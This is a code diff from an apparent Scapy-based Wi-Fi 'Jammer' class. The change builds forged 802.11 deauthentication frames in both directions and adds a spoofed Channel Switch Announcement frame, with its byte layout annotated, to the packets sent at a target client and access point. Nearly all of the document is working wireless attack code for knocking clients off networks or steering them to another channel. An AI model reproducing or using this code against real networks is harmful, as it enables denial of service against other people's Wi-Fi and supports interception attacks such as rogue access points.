@@ -209,12 +209,39 @@ class Jammer:
 
         pkts = []
 
-        deauth_pkt1 = RadioTap() / Dot11(addr1=self.client_mac, addr2=self.ap_mac, addr3=self.ap_mac) / Dot11Deauth()
+        deauth_pkt1 = RadioTap()/Dot11(
+            addr1=self.client_mac,
+            addr2=self.ap_mac,
+            addr3=self.ap_mac) / Dot11Deauth()
+        deauth_pkt2 = RadioTap()/Dot11(
+            addr1=self.ap_mac,
+            addr2=self.client_mac,
+            addr3=self.client_mac) / Dot11Deauth()
 
-        deauth_pkt2 = RadioTap() / Dot11(addr1=self.ap_mac, addr2=self.client_mac,
-                                         addr3=self.client_mac) / Dot11Deauth()
+        '''
+        Channel Switch Announcement
+        + Dot11
+            \x0d Action
+
+        + Raw
+            \x00 Management
+            \x04 CSA
+            \x25 Element ID [37]
+            \x03 Length
+            \x00 Channel Switch Mode
+            \x04 New Channel Num
+            \x00 Channel Switch Count
+        '''
+        csa_pkt = RadioTap()/Dot11(
+            addr1=self.client_mac,
+            addr2=self.ap_mac,
+            addr3=self.ap_mac,
+            type=0,
+            subtype=0x0d)/Raw("\x00\x04\x25\x03\x00\x04\x00")
+
         pkts.append(deauth_pkt1)
         pkts.append(deauth_pkt2)
+        pkts.append(csa_pkt)
 
         deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + channels[self.ap_channel] + deauth_pkt1[RadioTap].notdecoded[12:]
         deauth_pkt1[RadioTap].notdecoded = deauth_pkt1[RadioTap].notdecoded[:10] + channels[self.ap_channel] + deauth_pkt1[RadioTap].notdecoded[12:]
